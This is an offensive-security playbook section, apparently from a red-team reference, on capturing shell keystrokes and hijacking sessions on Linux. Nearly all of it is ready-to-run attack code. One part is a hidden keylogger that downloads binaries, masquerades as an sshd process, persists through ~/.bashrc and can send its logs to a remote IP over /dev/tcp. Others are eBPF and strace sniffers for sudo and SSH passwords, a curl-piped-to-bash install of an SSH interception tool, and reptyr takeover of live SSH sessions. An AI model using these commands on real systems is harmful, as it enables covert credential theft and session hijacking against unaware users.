# 08 — Session Sniffing & Hijacking

> Authorized use only. Capturing credentials/sessions is high-impact — log everything in the
> brain and handle captured creds per engagement rules.

---

## §pty-sniff — Sniff a user's shell keystrokes (no root)

Logs keystrokes to `~/.config/.pty/.@*`. Useful to capture sudo/ssh/git creds as a non-root user.

```bash
command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
&& { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
&& { script -h | grep -qm1 -- -I && cp "$(command -v script)" ~/.config/.pty/pty; :; } \
&& { [ ! -f ~/.config/.pty/pty ] && curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script"; :; } \
&& [ -f ~/.config/.pty/pty ] \
&& curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
&& chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
&& echo "Add to ~/.bashrc:" \
&& echo '[ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$'
```
- Uses zapper to hide options; needs `script` from util-linux ≥ 2.37 (`-I` flag).
- Log to a remote host instead: use `/dev/tcp/3.13.3.7/1524` as the output file.
- Disable logging for your own login: `ssh -o "SetEnv LC_PTY=1"`.

---

## §ebpf — Sniff all shells (eBPF, Linux)

```bash
curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
chmod 755 bpftrace
curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
./bpftrace -Bnone ptysnoop.bt
```
Hooks 120k+ kernel functions safely. See bpfhacks for sudo/su/ssh password sniffers.

**FreeBSD/Solaris (dtrace):** save the D script to `d`, then `(dtrace -sd >/tmp/.log &)`.

---

## §strace — Sniff with strace (read/write)

```bash
tit() {
	strace -e trace="${1:?}" -p "${2:?}" 2>&1 | gawk 'BEGIN{ORS=""}/\.\.\./ { next }; {$0 = substr($0, index($0, "\"")+1); sub(/"[^"]*$/, "", $0); gsub(/(\\33){1,}\[[0-9;]*[^0-9;]?||\\33O[ABCDR]?/, ""); if ($0=="\\r"){print "\n"}else{print $0; fflush()}}'
}
# tit read $(pidof -s ssh)
# tit read $(pidof -s bash)
# tit write $(pgrep -f 'sshd.*pts' | head -n1)
```

**Sniff SSHD (captures sudo passwords too) — trace write():**
```bash
ps -eF | grep -E '(^UID|sshd.*pts)' | grep -v ' grep'   # find sshd PID that spawned bash
tit write 7770                                          # sniff that PID
```

**If `ptrace_scope=1`** (strace fails on running sessions): use an `ssh` wrapper script that
runs `strace + ssh` and logs to `~/.ssh/logs/`, or SSH-IT:
```bash
bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
```

---

## §reptyr — Hijack a running SSH session

```bash
# build/get reptyr: https://github.com/nelhage/reptyr
ps ax -o pid,ppid,cmd | grep 'ssh '
./reptyr -T <SSH PID>
# or: ./reptyr -T $(pidof -s ssh)
```
**Must use `-T`** or the original user sees their SSH process suspend.
